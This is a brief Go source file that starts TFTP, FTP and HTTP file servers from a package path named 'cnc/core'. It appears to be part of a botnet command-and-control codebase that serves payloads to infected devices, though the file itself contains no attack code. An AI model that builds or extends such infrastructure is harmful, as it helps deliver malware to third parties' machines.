package frontend

import (
	"cnc/core/config"
	"cnc/core/frontend/ftp"
	"cnc/core/frontend/http"
	"cnc/core/frontend/tftp"
)

func Init() {
	if config.Config.WebServer.Enabled {
		go tftp.Serve()
		go ftp.Serve(config.Config.WebServer.Ftp)
		go ftp.Serve(config.Config.WebServer.Ftp2)
		go http.Serve2()
		go http.Serve()
	}
}
